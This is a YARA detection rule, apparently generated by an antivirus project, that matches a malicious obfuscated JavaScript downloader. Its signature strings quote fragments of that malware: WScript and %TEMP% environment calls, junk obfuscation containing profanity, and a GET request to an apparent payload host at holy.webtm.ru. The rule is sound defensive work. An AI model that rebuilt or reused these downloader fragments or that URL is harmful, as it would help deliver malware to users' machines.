rule sig_20160428_2d34450b949a72b34f22c97dc9e360fc {
  meta:
    description = "datamaliciousorder - file 20160428_2d34450b949a72b34f22c97dc9e360fc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6a701edd9b2ed37edd99c73ad368a41e425b13521bbf16f784c5bfc39b726910"

  strings:
    $s1  = "function DqjPztEspWqsByfImmBfh(DhzUblSynGaaSqoIohKzs){GmuIveXcoSqjBoySuuOuv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function DqjPztEspWqsByfImmBfh(DhzUblSynGaaSqoIohKzs){GmuIveXcoSqjBoySuuOuv[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function KvdYeyTofNzqCqgNoaIme() {return GmuIveXcoSqjBoySuuOuv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "var GmuIveXcoSqjBoySuuOuv = function AbuVnsTttNxzVteQkwTkh() {return BfhCtvMyvYtgXncPzpCsg[XqyCqrNoyWgzXbqAqcTyt](\"WScript\"+\"" ascii
    $s5  = "return HjiLnzSqcVnlXuuYixHcj - AhoIerSwzBxaDkeNysXke;};" fullword ascii
    $s6  = "function LddSelWqvSkuJjoFhmQit(HjiLnzSqcVnlXuuYixHcj, AhoIerSwzBxaDkeNysXke){OrmKstKikGfcMhhWqkFvz = OrmKstKikGfcMhhWqkFvz * 1; " ascii
    $s7  = "RzdCwfDvbAaeLbhGizZkt[DkcCgxDxbGaiCshIwgCnz](\"G\" + \"ET\", \"http://holy.webtm.ru/o4ksla\", false);" fullword ascii
    $s8  = "var BfhCtvMyvYtgXncPzpCsg = this[\"WScript\"];" fullword ascii
    $s9  = "var GmuIveXcoSqjBoySuuOuv = function AbuVnsTttNxzVteQkwTkh() {return BfhCtvMyvYtgXncPzpCsg[XqyCqrNoyWgzXbqAqcTyt](\"WScript\"+\"" ascii
    $s10 = "function KvdYeyTofNzqCqgNoaIme() {return GmuIveXcoSqjBoySuuOuv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function LddSelWqvSkuJjoFhmQit(HjiLnzSqcVnlXuuYixHcj, AhoIerSwzBxaDkeNysXke){OrmKstKikGfcMhhWqkFvz = OrmKstKikGfcMhhWqkFvz * 1; " ascii
    $s12 = "if (RzdCwfDvbAaeLbhGizZkt[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function PinTysXmnArrTkuEdwNzv(){return OvrOkeQmeUheRpkQonVpr + \"\";};" fullword ascii
    $s14 = "function JofGvrDntImgDzbPudEvl(IbyUydNjrEeoCooHoxEtj) {var UudJycSltKfrMvyYpvNht = (1, 2, 3, 4, 5, IbyUydNjrEeoCooHoxEtj); retur" ascii
    $s15 = "return LddSelWqvSkuJjoFhmQit(1 == 1 ? KmkPdtJgrHbtRdcVejJmt : 0, 1 == 1 ? RphPhqOahPttZxhTigLtw : 0);" fullword ascii
    $s16 = "function JofGvrDntImgDzbPudEvl(IbyUydNjrEeoCooHoxEtj) {var UudJycSltKfrMvyYpvNht = (1, 2, 3, 4, 5, IbyUydNjrEeoCooHoxEtj); retur" ascii
    $s17 = "function TegPrkLulHmeGwzKtcLfr()" fullword ascii
    $s18 = "InlDoiBluXgmOcnJwpHyj = true;" fullword ascii
    $s19 = "var SexHqlRzqDrpQbwAzeDqb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "var InlDoiBluXgmOcnJwpHyj = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}